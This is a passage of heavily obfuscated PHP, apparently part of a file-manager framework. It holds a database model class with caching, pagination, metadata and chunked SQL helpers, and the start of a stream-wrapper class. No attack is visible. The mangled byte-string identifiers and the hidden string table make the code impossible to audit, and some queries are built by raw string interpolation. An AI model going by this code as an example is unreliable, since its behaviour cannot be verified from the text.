™ñÑó) { return $_SERVER[ç¦¬”œš][100]; }, $Íì«¹´•); return json_decode($Íì«¹´•); } public function setAutoIncrement($Ïã¦ÂÍš) { $œÁÒò‘¬ = array($this->getPk() => $Ïã¦ÂÍš); $¶àÁŠ¤ = $this->data($œÁÒò‘¬)->add(); if ($¶àÁŠ¤) { $this->delete($¶àÁŠ¤); } } public function getAutoIncrement() { $™µ£àºë = $this->getTableName(); $õèêÌ„Ÿ = $this->max($this->getPk()); $²êËÄ = $this->query("\x73\x68\157\x77\40\x74\x61\142\x6c\x65\x20\x73\164\x61\164\x75\x73\40\x77\150\145\162\x65\40\x4e\x61\x6d\145\75\x27{$™µ£àºë}\x27"); $ÜĞïºàª = $²êËÄ[0][$_SERVER[ç¦¬”œš][436]]; $âÀßóëÔ = max($õèêÌ„Ÿ, $ÜĞïºàª); return $âÀßóëÔ; } protected function _callBefore($œõ„¥Âö, $–æõ²×¤) { return $this->cacheCallCheck($œõ„¥Âö, $–æõ²×¤, !1); } protected function _callAfter($ˆ’äÖÑŠ, $¡ãü™øé) { return $this->cacheCallCheck($ˆ’äÖÑŠ, $¡ãü™øé, !0); } protected function cacheFunctionAlias($±Ô¨±Ö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‹…ú”¯Ì, $ƒÜâá»õ, $Öª°íí± = false) { $…óÜ¢® = $this->cacheFunctionAlias($ƒÜâá»õ); if (!$…óÜ¢®) { return; } foreach ($…óÜ¢® as $şŒ„²­ó => $—à—ÈÂ›) { $¼ÖßÒì = $—à—ÈÂ›[0]; $Ì¨åİ·€ = explode($_SERVER[ç¦¬”œš][50], $—à—ÈÂ›[1]); if ($‹…ú”¯Ì == $şŒ„²­ó) { return $this->cacheFunctionGet($şŒ„²­ó, $¼ÖßÒì); } if ($Öª°íí± && in_array($‹…ú”¯Ì, $Ì¨åİ·€)) { $this->cacheFunctionClear($şŒ„²­ó, $¼ÖßÒì); } } } public function cacheFunctionGet($å¬¼ªñÂ, $­€‹¨»¾) { $¢»Ú™ Ÿ = $this->cacheKeyMake($å¬¼ªñÂ, $­€‹¨»¾); $£ñÀŒ‰â = Cache::get($¢»Ú™ Ÿ); if (!is_array($£ñÀŒ‰â)) { $£ñÀŒ‰â = call_user_func_array(array($this, $å¬¼ªñÂ), array($­€‹¨»¾, !0)); Cache::set($¢»Ú™ Ÿ, $£ñÀŒ‰â); } return $£ñÀŒ‰â; } public function cacheFunctionClear($‹”İü•…, $­¿Üûãİ) { $Áú¶î§¨ = $­¿Üûãİ; if (!is_array($­¿Üûãİ)) { $Áú¶î§¨ = array($­¿Üûãİ); } foreach ($Áú¶î§¨ as $•íªÀ´) { $æÛş€ùÌ = $this->cacheKeyMake($‹”İü•…, $•íªÀ´); Cache::remove($æÛş€ùÌ); } } private function cacheKeyMake($ÉÅÆ‹¤ú, $Ëñş«Áß) { $ş¢Óòü =& $_SERVER[ç¦¬”œš]; return get_class($this) . $ş¢Óòü[11] . $ÉÅÆ‹¤ú . $ş¢Óòü[437] . $Ëñş«Áß; } protected function selectPageReset() { $¹æ´òÆú =& $_SERVER[ç¦¬”œš]; if (isset($GLOBALS[$¹æ´òÆú[438]])) { return; } $GLOBALS[$¹æ´òÆú[438]] = isset($GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[439]]) ? $GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[439]] : !1; $GLOBALS[$¹æ´òÆú[440]] = isset($GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[429]]) ? $GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[429]] : !1; $GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[439]] = !1; $GLOBALS[$¹æ´òÆú[7]][$¹æ´òÆú[429]] = !1; } protected function selectPageRestore() { $ø©şıï¯ =& $_SERVER[ç¦¬”œš]; if (!isset($GLOBALS[$ø©şıï¯[438]])) { return; } $GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[439]] = $GLOBALS[$ø©şıï¯[438]]; $GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[429]] = $GLOBALS[$ø©şıï¯[440]]; if ($GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[439]] === !1) { unset($GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[439]]); } if ($GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[429]] === !1) { unset($GLOBALS[$ø©şıï¯[7]][$ø©şıï¯[429]]); } unset($GLOBALS[$ø©şıï¯[438]]); unset($GLOBALS[$ø©şıï¯[440]]); } protected function selectPage($Œ´±áÍø = 200, $Ê³ÆˆŠ = 1) { $•ÊÏÕã =& $_SERVER[ç¦¬”œš]; global $in; $Ğ´òá—· = $this->optionsValue(); $«Œ´ù¬æ = 50000; $Œ´±áÍø = isset($in[$•ÊÏÕã[439]]) && $in[$•ÊÏÕã[439]] ? $in[$•ÊÏÕã[439]] : $Œ´±áÍø; if ($Œ´±áÍø === -1) { $in[$•ÊÏÕã[439]] = !1; $«Œ´ù¬æ = 100000000; $Œ´±áÍø = $«Œ´ù¬æ; } $©úš–á˜ = $Ğ´òá—·; $©úš–á˜[$•ÊÏÕã[441]] = array(); $Œ´±áÍø = intval($Œ´±áÍø); $Œ´±áÍø = $Œ´±áÍø <= 5 ? 5 : ($Œ´±áÍø >= $«Œ´ù¬æ ? $«Œ´ù¬æ : $Œ´±áÍø); $Ê³ÆˆŠ = intval(isset($in[$•ÊÏÕã[429]]) && $in[$•ÊÏÕã[429]] ? $in[$•ÊÏÕã[429]] : $Ê³ÆˆŠ); $Ê³ÆˆŠ = $Ê³ÆˆŠ <= 1 ? 1 : $Ê³ÆˆŠ; $¿û™ìÊ = array(); $Ì»¾Ï±î = 1; if ($Ê³ÆˆŠ == 1 && $Ì»¾Ï±î) { $this->optionsValue($Ğ´òá—·); $¿û™ìÊ = $this->page($Ê³ÆˆŠ, $Œ´±áÍø)->select(); $óã¨¦©â = is_array($¿û™ìÊ) ? count($¿û™ìÊ) : 0; if ($óã¨¦©â < $Œ´±áÍø) { $ğá˜ú = 1; } else { $this->optionsValue($©úš–á˜); $óã¨¦©â = intval($this->count()); $ğá˜ú = ceil($óã¨¦©â / $Œ´±áÍø); } } else { $this->optionsValue($©úš–á˜); $óã¨¦©â = intval($this->count()); $ğá˜ú = ceil($óã¨¦©â / $Œ´±áÍø); $Ê³ÆˆŠ = $Ê³ÆˆŠ >= $ğá˜ú ? $ğá˜ú : $Ê³ÆˆŠ; $this->optionsValue($Ğ´òá—·); $¿û™ìÊ = $this->page($Ê³ÆˆŠ, $Œ´±áÍø)->select(); } if (!is_array($¿û™ìÊ)) { $¿û™ìÊ = array(); } if ($ğá˜ú == 1) { $óã¨¦©â = count($¿û™ìÊ); } $˜‡Í­• = array($•ÊÏÕã[442] => array($•ÊÏÕã[443] => $óã¨¦©â, $•ÊÏÕã[439] => $Œ´±áÍø, $•ÊÏÕã[429] => $Ê³ÆˆŠ, $•ÊÏÕã[444] => $ğá˜ú), $•ÊÏÕã[445] => $¿û™ìÊ); return $˜‡Í­•; } protected function checkLength($Ü™Éëöé, $ü€ÛÅĞ» = 0, $ÃÔ¶ÂÁà = '') { $¿Ä¨¦‰í =& $_SERVER[ç¦¬”œš]; $ü€ÛÅĞ» = $ü€ÛÅĞ» ? $ü€ÛÅĞ» : 65536; if (!$Ü™Éëöé || strlen($Ü™Éëöé) < $ü€ÛÅĞ») { return; } $ÃÔ¶ÂÁà = $ÃÔ¶ÂÁà ? $ÃÔ¶ÂÁà . $¿Ä¨¦‰í[74] : $¿Ä¨¦‰í[12]; show_json($ÃÔ¶ÂÁà . LNG($¿Ä¨¦‰í[446]) . "\50{$ü€ÛÅĞ»}\51", !1); } protected function metaSet($ñ«Â®Ç¯, $ªÈÄÑ‰Õ = null, $‡Â–ëÁş = null) { $¬€ô÷ãŸ =& $_SERVER[ç¦¬”œš]; if (!$this->tableMeta || !$ñ«Â®Ç¯) { return !1; } $Ôö”™üŠ = $this->tableMeta[$¬€ô÷ãŸ[447]]; $ğèÒŒµÓ = $this->tableMeta[$¬€ô÷ãŸ[448]]; $´ÑÚ² = Model($ğèÒŒµÓ); $¹Á÷± = array($Ôö”™üŠ => $ñ«Â®Ç¯, $¬€ô÷ãŸ[449] => $ªÈÄÑ‰Õ); if (is_null($ªÈÄÑ‰Õ)) { return $´ÑÚ²->where(array($Ôö”™üŠ => $ñ«Â®Ç¯))->delete(); } if (is_null($‡Â–ëÁş) && is_string($ªÈÄÑ‰Õ)) { return $´ÑÚ²->where($¹Á÷±)->delete(); } $›Í²ñ·Ò = is_array($ªÈÄÑ‰Õ) ? $ªÈÄÑ‰Õ : array(); if (is_string($ªÈÄÑ‰Õ)) { $›Í²ñ·Ò[$ªÈÄÑ‰Õ] = $‡Â–ëÁş; } $Â¯Õ®‹£ = array(); foreach ($›Í²ñ·Ò as $­ğ¶Ã¸ş => $‘‡İü×õ) { if (is_null($‘‡İü×õ) && is_string($­ğ¶Ã¸ş)) { $´ÑÚ²->where(array($Ôö”™üŠ => $ñ«Â®Ç¯, $¬€ô÷ãŸ[449] => $­ğ¶Ã¸ş))->delete(); continue; } $this->checkLength($‘‡İü×õ, !1, $ğèÒŒµÓ . $¬€ô÷ãŸ[4] . $­ğ¶Ã¸ş); $Â¯Õ®‹£[] = array($Ôö”™üŠ => $ñ«Â®Ç¯, $¬€ô÷ãŸ[97] => $­ğ¶Ã¸ş, $¬€ô÷ãŸ[450] => $‘‡İü×õ); } $Ëğ§¦Ü½ = $¬€ô÷ãŸ[451] . $ğèÒŒµÓ; CacheLock::lock($Ëğ§¦Ü½); $´ÑÚ²->where(array($Ôö”™üŠ => $ñ«Â®Ç¯))->addAll($Â¯Õ®‹£, array(), !0); CacheLock::unlock($Ëğ§¦Ü½); return !0; } public function metaGet($œÅı§³­, $Ğ¸ãëÜâ = false) { $›–Ó€Õİ =& $_SERVER[ç¦¬”œš]; if (!$this->tableMeta) { return array(); } $óÃ“´÷Å = $this->tableMeta[$›–Ó€Õİ[447]]; $˜İ¼äÉ¦ = Model($this->tableMeta[$›–Ó€Õİ[448]]); if ($Ğ¸ãëÜâ) { $‘óøÕŒÔ = array($óÃ“´÷Å => $œÅı§³­, $›–Ó€Õİ[97] => $Ğ¸ãëÜâ); return $˜İ¼äÉ¦->where($‘óøÕŒÔ)->getField($›–Ó€Õİ[450]); } $‘óøÕŒÔ = array($óÃ“´÷Å => $œÅı§³­); $ƒÛÎÌÙ = $˜İ¼äÉ¦->field($›–Ó€Õİ[452])->where($‘óøÕŒÔ)->select(); $ƒÛÎÌÙ = array_to_keyvalue($ƒÛÎÌÙ, $›–Ó€Õİ[97], $›–Ó€Õİ[450]); return $ƒÛÎÌÙ; } private function checkDataAutoHas($ˆö§ßÄÉ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÚÎèã£î) { if (in_array($ˆö§ßÄÉ, explode($_SERVER[ç¦¬”œš][50], $ÚÎèã£î[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$©•§•á±, $Î×¬ğ°) { $ÃÃ·´š¥ =& $_SERVER[ç¦¬”œš]; if (!is_array($©•§•á±)) { return; } foreach ($this->dataAuto as $‰Şûê•) { $ì…¾Œ—Ş = $‰Şûê•[0]; if (!in_array($Î×¬ğ°, explode($ÃÃ·´š¥[50], $‰Şûê•[2]))) { continue; } switch (trim($‰Şûê•[3])) { case $ÃÃ·´š¥[397]: case $ÃÃ·´š¥[398]: $òäûè®Ç = $‰Şûê•[1]; $ğ­ş€¬ = isset($‰Şûê•[4]) ? (array) $‰Şûê•[4] : array(); if ($òäûè®Ç == $ÃÃ·´š¥[206] && array_key_exists($ì…¾Œ—Ş, $©•§•á±)) { if (!$©•§•á±[$ì…¾Œ—Ş]) { unset($©•§•á±[$ì…¾Œ—Ş]); } break; } if (isset($©•§•á±[$ì…¾Œ—Ş])) { array_unshift($ğ­ş€¬, $©•§•á±[$ì…¾Œ—Ş]); } if ($ÃÃ·´š¥[397] == $‰Şûê•[3]) { $©•§•á±[$ì…¾Œ—Ş] = call_user_func_array($òäûè®Ç, $ğ­ş€¬); } else { $©•§•á±[$ì…¾Œ—Ş] = call_user_func_array(array(&$this, $òäûè®Ç), $ğ­ş€¬); } break; case $ÃÃ·´š¥[347]: if (isset($©•§•á±[$ì…¾Œ—Ş]) && $©•§•á±[$ì…¾Œ—Ş]) { $©•§•á±[$ì…¾Œ—Ş] = call_user_func_array(array(&$this, $‰Şûê•[1]), array($©•§•á±[$ì…¾Œ—Ş])); } break; case $ÃÃ·´š¥[350]: $©•§•á±[$ì…¾Œ—Ş] = $©•§•á±[$‰Şûê•[1]]; break; case $ÃÃ·´š¥[370]: if (isset($©•§•á±[$ì…¾Œ—Ş]) && !is_string($©•§•á±[$ì…¾Œ—Ş])) { $©•§•á±[$ì…¾Œ—Ş] = json_encode_force($©•§•á±[$ì…¾Œ—Ş]); } break; case $ÃÃ·´š¥[399]: if ($©•§•á±[$ì…¾Œ—Ş] === $ÃÃ·´š¥[12]) { unset($©•§•á±[$ì…¾Œ—Ş]); } break; case $ÃÃ·´š¥[400]: $©•§•á±[$ì…¾Œ—Ş] = $‰Şûê•[1]; default: break; } } if ($Î×¬ğ° == $ÃÃ·´š¥[431]) { $à™ÃÜûØ = strtolower($this->db->getDbType()); if (strpos($à™ÃÜûØ, $ÃÃ·´š¥[13]) !== 0) { return; } $â°êƒª = $this->field(!0)->fields; $¼–¿öŒ… = $â°êƒª[$ÃÃ·´š¥[329]]; if (isset($â°êƒª[$ÃÃ·´š¥[328]])) { unset($¼–¿öŒ…[$â°êƒª[$ÃÃ·´š¥[328]]]); } foreach ($¼–¿öŒ… as $º©íÉ·‚ => $Î×¬ğ°) { if (!isset($©•§•á±[$º©íÉ·‚])) { $©•§•á±[$º©íÉ·‚] = $ÃÃ·´š¥[12]; } } } } private function dataAfterFilter(&$•Ç¨·Ä”) { $ãå½—× =& $_SERVER[ç¦¬”œš]; foreach ($this->dataAuto as $éş’éÕ) { $äÒ˜¡“Ñ = $éş’éÕ[0]; if (!isset($•Ç¨·Ä”[$äÒ˜¡“Ñ])) { continue; } if (!in_array($ãå½—×[433], explode($ãå½—×[50], $éş’éÕ[2]))) { continue; } switch (trim($éş’éÕ[3])) { case $ãå½—×[397]: case $ãå½—×[398]: $“öú¡‡ = isset($éş’éÕ[4]) ? (array) $éş’éÕ[4] : array(); array_unshift($“öú¡‡, $•Ç¨·Ä”[$äÒ˜¡“Ñ]); if (isset($éş’éÕ[4]) && $éş’éÕ[4] == $ãå½—×[453]) { $“öú¡‡ = array($•Ç¨·Ä”[$äÒ˜¡“Ñ]); } if ($ãå½—×[397] == $éş’éÕ[3]) { $•Ç¨·Ä”[$äÒ˜¡“Ñ] = call_user_func_array($éş’éÕ[1], $“öú¡‡); } else { $•Ç¨·Ä”[$äÒ˜¡“Ñ] = call_user_func_array(array(&$this, $éş’éÕ[1]), $“öú¡‡); } break; case $ãå½—×[347]: if (isset($•Ç¨·Ä”[$äÒ˜¡“Ñ]) && $•Ç¨·Ä”[$äÒ˜¡“Ñ]) { $•Ç¨·Ä”[$äÒ˜¡“Ñ] = call_user_func_array(array(&$this, $éş’éÕ[1]), array($•Ç¨·Ä”[$äÒ˜¡“Ñ])); } break; case $ãå½—×[350]: $•Ç¨·Ä”[$äÒ˜¡“Ñ] = $•Ç¨·Ä”[$éş’éÕ[1]]; break; case $ãå½—×[370]: $¨²óûŠœ = $•Ç¨·Ä”[$äÒ˜¡“Ñ]; $•Ç¨·Ä”[$äÒ˜¡“Ñ] = json_decode($¨²óûŠœ, !0); if (is_null($•Ç¨·Ä”[$äÒ˜¡“Ñ])) { $•Ç¨·Ä”[$äÒ˜¡“Ñ] = $¨²óûŠœ; } break; case $ãå½—×[399]: if ($•Ç¨·Ä”[$äÒ˜¡“Ñ] === $ãå½—×[12]) { unset($•Ç¨·Ä”[$äÒ˜¡“Ñ]); } break; case $ãå½—×[400]: $•Ç¨·Ä”[$äÒ˜¡“Ñ] = $éş’éÕ[1]; break; default: break; } } } public function saveAll($”Ù»ğ) { $ôˆ…É¢ =& $_SERVER[ç¦¬”œš]; $çÁ‘³ÜÏ = $this->tablePrefix . $this->tableName; $şÇŒçƒÒ = self::SQL_WHERE_IN_CHUNK; $”Ù»ğ = is_array($”Ù»ğ) ? $”Ù»ğ : array(); $ÂóÊ”‡í = $ôˆ…É¢[454]; $–œ¾£Ÿè = 0; $è§­¼ = array(); $ˆâ »ñ¾ = count($”Ù»ğ); for ($¨°•Ïå = 0; $¨°•Ïå < $ˆâ »ñ¾; $¨°•Ïå++) { $ù¯×ÇÑ = $”Ù»ğ[$¨°•Ïå]; if (!is_array($ù¯×ÇÑ) || count($ù¯×ÇÑ) != 4) { continue; } $Çœ¾Á¾ = "\x55\120\104\x41\124\105\40\140{$çÁ‘³ÜÏ}\140\x20\123\105\124\40{$ù¯×ÇÑ[2]}\x20\75\40\x43\101\x53\105\x20{$ù¯×ÇÑ[0]}\x20\xa"; if ($–œ¾£Ÿè == 0) { $ÂóÊ”‡í = $Çœ¾Á¾; } $è§­¼[] = $ôˆ…É¢[121] . $ù¯×ÇÑ[1] . $ôˆ…É¢[121]; $–œ¾£Ÿè++; $ÂóÊ”‡í .= "\x20\127\110\x45\x4e\40\47{$ù¯×ÇÑ[1]}\x27\40\x54\x48\105\116\x20\x27{$ù¯×ÇÑ[3]}\47\x20\xa"; if ($–œ¾£Ÿè == $şÇŒçƒÒ || $¨°•Ïå == $ˆâ »ñ¾ - 1) { $»‹ì£Ó = implode($ôˆ…É¢[50], $è§­¼); $ÂóÊ”‡í .= "\40\105\x4e\104\x20\40\127\x48\105\x52\105\x20{$ù¯×ÇÑ[0]}\x20\x49\116\40\50{$»‹ì£Ó}\x29\40"; $this->execute($ÂóÊ”‡í); $–œ¾£Ÿè = 0; $ÂóÊ”‡í = $Çœ¾Á¾; $this->chunkEventCheck(count($è§­¼)); $è§­¼ = array(); } } $this->chunkEventSet(); } public function saveAllEach($”ÏØ¶ê) { $É˜ÂÏ„í =& $_SERVER[ç¦¬”œš]; $’ÚèÚÓã = $this->tablePrefix . $this->tableName; foreach ($”ÏØ¶ê as $ê‡¨Ó½©) { if (!is_array($ê‡¨Ó½©) || count($ê‡¨Ó½©) != 4) { continue; } $î£Ï¼€• = $ê‡¨Ó½©[0] . $É˜ÂÏ„í[455] . $ê‡¨Ó½©[1] . $É˜ÂÏ„í[121]; $ÀéğÖôº = $ê‡¨Ó½©[2] . $É˜ÂÏ„í[455] . $ê‡¨Ó½©[3] . $É˜ÂÏ„í[121]; $š¼ÆØŞ§ = "\x75\x70\x64\141\164\145\x20{$’ÚèÚÓã}\40\x73\145\x74\x20{$ÀéğÖôº}\40\167\x68\145\162\145\x20{$î£Ï¼€•}\73"; $this->execute($š¼ÆØŞ§); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($½¡ŒÅ = false, $»Š”–Å® = false) { $this->_chunkEvent = $½¡ŒÅ; $this->_chunkEventParam = $»Š”–Å®; } private function chunkEventCheck($¤á¬³ıÅ) { if (!$this->_chunkEvent) { return; } $©É÷Š–­ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $©É÷Š–­[$_SERVER[ç¦¬”œš][456]] = $¤á¬³ıÅ; Hook::trigger($this->_chunkEvent, $©É÷Š–­); } public function addAll($ÎÂ¸¶—é, $ˆÌô¨éÀ = array(), $ƒÎû¼’” = false) { $æ—äé³ =& $_SERVER[ç¦¬”œš]; ignore_timeout(); $»úÅ”ºå = self::SQL_WHERE_IN_CHUNK; if (empty($ÎÂ¸¶—é)) { $this->error = think_lang($æ—äé³[348]); return !1; } $ˆÌô¨éÀ = $this->_parseOptions($ˆÌô¨éÀ); foreach ($ÎÂ¸¶—é as $¡æëı => $ó¦‡ş) { $ÎÂ¸¶—é[$¡æëı] = $this->_facade($ó¦‡ş); $this->_beforeInsert($ÎÂ¸¶—é[$¡æëı], $ˆÌô¨éÀ); } if (method_exists($this->db, $æ—äé³[349])) { for ($ŸÑ­øÈ = 0; $ŸÑ­øÈ < count($ÎÂ¸¶—é); $ŸÑ­øÈ += $»úÅ”ºå) { $®¨Ÿ‡×Ã = array_slice($ÎÂ¸¶—é, $ŸÑ­øÈ, $»úÅ”ºå); if (!is_array($®¨Ÿ‡×Ã) || count($®¨Ÿ‡×Ã) == 0) { break; } $öĞ£æüè = $this->db->insertAll($®¨Ÿ‡×Ã, $ˆÌô¨éÀ, $ƒÎû¼’”); $this->chunkEventCheck(count($®¨Ÿ‡×Ã)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÎÂ¸¶—é as $¡æëı => $ó¦‡ş) { $öĞ£æüè = $this->db->insert($ó¦‡ş, $ˆÌô¨éÀ, $ƒÎû¼’”); } $this->commit(); } if (!1 !== $öĞ£æüè) { $Èé‚æ­ = $this->getLastInsID(); if ($Èé‚æ­) { return $Èé‚æ­; } } return $öĞ£æüè; } public function save($É±¬Ó‚‘ = '', $£ˆ’¥Œ¤ = array()) { $¢óõßÑ =& $_SERVER[ç¦¬”œš]; $‘ÙÃ¨¶¶ = self::SQL_WHERE_IN_CHUNK; $¹¦óÖø = $this->optionsValue(); $Èì›Ğ÷­ = $this->findWhereField($¹¦óÖø); if (!$Èì›Ğ÷­) { return parent::save($É±¬Ó‚‘, $£ˆ’¥Œ¤); } $…ú£ÈÒ† = 0; $Ê¶ôÒ°Ñ = $¹¦óÖø[$¢óõßÑ[352]][$Èì›Ğ÷­][1]; $Ê¶ôÒ°Ñ = is_array($Ê¶ôÒ°Ñ) ? $Ê¶ôÒ°Ñ : array(); $‹Ğ¯ôÖ = count($Ê¶ôÒ°Ñ); for ($šÜçÏ¦£ = 0; $šÜçÏ¦£ < $‹Ğ¯ôÖ; $šÜçÏ¦£ += $‘ÙÃ¨¶¶) { $ë—ä‹¿ä = array_slice($Ê¶ôÒ°Ñ, $šÜçÏ¦£, $‘ÙÃ¨¶¶); if (!is_array($ë—ä‹¿ä) || count($ë—ä‹¿ä) == 0) { break; } $¹¦óÖø[$¢óõßÑ[352]][$Èì›Ğ÷­][1] = $ë—ä‹¿ä; $this->optionsValue($¹¦óÖø); $…ú£ÈÒ† += parent::save($É±¬Ó‚‘, $£ˆ’¥Œ¤); $this->chunkEventCheck(count($ë—ä‹¿ä)); } $this->chunkEventSet(); return $…ú£ÈÒ†; } public function add($Í„ÑÍ› = '', $­Ûƒ½Óõ = array(), $òÆ„İäÊ = false) { if ($this->addTaskStatus && is_array($Í„ÑÍ›)) { $this->addTaskData[] = $Í„ÑÍ›; return; } return parent::add($Í„ÑÍ›, $­Ûƒ½Óõ, $òÆ„İäÊ); } public function parseWhereLike($ÎäªêÏ¢, $ç‚ãƒ¾ã = '', $İ¥ŒşÂ½ = false, &$ØÆ»æÌÅ = false) { $¼üñÜû =& $_SERVER[ç¦¬”œš]; $Ÿô™éÈ = $GLOBALS[$¼üñÜû[6]][$¼üñÜû[457]]; if (!$Ÿô™éÈ[$¼üñÜû[458]]) { return $ÎäªêÏ¢; } if (!is_array($ÎäªêÏ¢)) { return $ÎäªêÏ¢; } $«ØôÎÎ¹ = array(); $áˆÑ·Ü± = 0; foreach ($ÎäªêÏ¢ as $§çŞˆ×Û => $Ú’¼†òç) { if (is_array($Ú’¼†òç) && count($Ú’¼†òç) == 2 && $Ú’¼†òç[0] == $¼üñÜû[459] && is_string($Ú’¼†òç[1]) && substr($Ú’¼†òç[1], 0, 1) == $¼üñÜû[460] && substr($Ú’¼†òç[1], strlen($Ú’¼†òç[1]) - 1, 1) == $¼üñÜû[460]) { $ØÆ»æÌÅ = !0; $‘ˆÜ¡” = is_string($§çŞˆ×Û) ? $§çŞˆ×Û : $ç‚ãƒ¾ã; $˜Š±£ƒº = substr($Ú’¼†òç[1], 1, strlen($Ú’¼†òç[1]) - 2); $˜Š±£ƒº = $this->db->escapeString($˜Š±£ƒº); if (!strpos($‘ˆÜ¡”, $¼üñÜû[10])) { $‘ˆÜ¡” = $¼üñÜû[461] . $‘ˆÜ¡” . $¼üñÜû[461]; } $ª‘„ñ = $¼üñÜû[220] . $˜Š±£ƒº . $¼üñÜû[220]; $˜Š±£ƒº = str_replace(array($¼üñÜû[10], $¼üñÜû[462], $¼üñÜû[11]), $¼üñÜû[463], $˜Š±£ƒº); if ($Ÿô™éÈ[$¼üñÜû[464]]) { $ª‘„ñ = $¼üñÜû[465] . $˜Š±£ƒº . $¼üñÜû[466]; if ($Ÿô™éÈ[$¼üñÜû[467]]) { $ª‘„ñ = $¼üñÜû[466] . $˜Š±£ƒº . $¼üñÜû[465]; } } $«ØôÎÎ¹[$áˆÑ·Ü±] = $¼üñÜû[468] . $‘ˆÜ¡” . $¼üñÜû[469] . $ª‘„ñ . $¼üñÜû[470]; $áˆÑ·Ü±++; continue; } if (is_array($Ú’¼†òç)) { $ç‚ãƒ¾ã = is_string($§çŞˆ×Û) ? $§çŞˆ×Û : $ç‚ãƒ¾ã; $Ú’¼†òç = $this->parseWhereLike($Ú’¼†òç, $ç‚ãƒ¾ã, !0, $ØÆ»æÌÅ); } if (is_numeric($§çŞˆ×Û)) { $«ØôÎÎ¹[$áˆÑ·Ü±] = $Ú’¼†òç; $áˆÑ·Ü±++; } else { $«ØôÎÎ¹[$§çŞˆ×Û] = $Ú’¼†òç; } } if ($ØÆ»æÌÅ && !$İ¥ŒşÂ½) { } return $«ØôÎÎ¹; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¾˜“Îã« = array()) { $ÒØ…Ç¦£ =& $_SERVER[ç¦¬”œš]; $ÔÓúÓó = self::SQL_WHERE_IN_CHUNK; $ÅËÕİÅ† = $this->optionsValue(); $—Öş¾î = $this->findWhereField($ÅËÕİÅ†); if (!$—Öş¾î || isset($ÅËÕİÅ†[$ÒØ…Ç¦£[368]]) || isset($ÅËÕİÅ†[$ÒØ…Ç¦£[429]])) { return parent::select($¾˜“Îã«); } $•¢ÎµÖõ = $ÅËÕİÅ†[$ÒØ…Ç¦£[352]][$—Öş¾î][1]; $•¢ÎµÖõ = is_array($•¢ÎµÖõ) ? $•¢ÎµÖõ : array(); $¶Ú×‡¶ı = null; for ($“«Ë˜«÷ = 0; $“«Ë˜«÷ < count($•¢ÎµÖõ); $“«Ë˜«÷ += $ÔÓúÓó) { $Íàóû¦î = array_slice($•¢ÎµÖõ, $“«Ë˜«÷, $ÔÓúÓó); if (!is_array($Íàóû¦î) || count($Íàóû¦î) == 0) { break; } $ÅËÕİÅ†[$ÒØ…Ç¦£[352]][$—Öş¾î][1] = $Íàóû¦î; $this->optionsValue($ÅËÕİÅ†); $¬ß§ï´¥ = parent::select($¾˜“Îã«); if (!$¬ß§ï´¥) { continue; } $¶Ú×‡¶ı = is_array($¶Ú×‡¶ı) ? $¶Ú×‡¶ı : array(); $¶Ú×‡¶ı = array_merge($¶Ú×‡¶ı, $¬ß§ï´¥); } return $¶Ú×‡¶ı; } public function delete($ÍŒÇÌ£ì = array()) { $í¦ë²ß =& $_SERVER[ç¦¬”œš]; $†€îş‹ = self::SQL_WHERE_IN_CHUNK; $¾¼îÉÕ = $this->optionsValue(); $º’¯µ¸ = $this->findWhereField($¾¼îÉÕ); if (!$º’¯µ¸) { return parent::delete($ÍŒÇÌ£ì); } $åáÂ®ŞÄ = 0; $÷°ÁÏ ° = $¾¼îÉÕ[$í¦ë²ß[352]][$º’¯µ¸][1]; $÷°ÁÏ ° = is_array($÷°ÁÏ °) ? $÷°ÁÏ ° : array(); for ($¼„Îî©ß = 0; $¼„Îî©ß < count($÷°ÁÏ °); $¼„Îî©ß += $†€îş‹) { $Ù©Ùû³Ø = array_slice($÷°ÁÏ °, $¼„Îî©ß, $†€îş‹); if (!is_array($Ù©Ùû³Ø) || count($Ù©Ùû³Ø) == 0) { break; } $¾¼îÉÕ[$í¦ë²ß[352]][$º’¯µ¸][1] = $Ù©Ùû³Ø; $this->optionsValue($¾¼îÉÕ); $åáÂ®ŞÄ += parent::delete($ÍŒÇÌ£ì); } return $åáÂ®ŞÄ; } private function findWhereField($ªì˜¢Ï) { $¹ªüÏÁÄ =& $_SERVER[ç¦¬”œš]; $«õëıí = self::SQL_WHERE_IN_CHUNK; if (!is_array($ªì˜¢Ï) || !is_array($ªì˜¢Ï[$¹ªüÏÁÄ[352]])) { return !1; } foreach ($ªì˜¢Ï[$¹ªüÏÁÄ[352]] as $ ì©¸©è => $»“ÇÓò‘) { if (is_array($»“ÇÓò‘) && isset($»“ÇÓò‘[0]) && is_string($»“ÇÓò‘[0]) && strtolower($»“ÇÓò‘[0]) == $¹ªüÏÁÄ[7] && is_array($»“ÇÓò‘[1]) && count($»“ÇÓò‘[1]) > $«õëıí) { ignore_timeout(); return $ ì©¸©è; } } return !1; } public function setMasterDB($íº´Ã½€ = true) { think_config($_SERVER[ç¦¬”œš][471], $íº´Ã½€); } } goto cÁË´ËŒãÆ; béáÇ—¦ˆÕ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ğ«ÉˆËù, $ë²„¿»Ú = '') { $this->info = $this->info($ğ«ÉˆËù); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ç¦¬”œš][87]]; $this->pathOpen = $ğ«ÉˆËù; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = 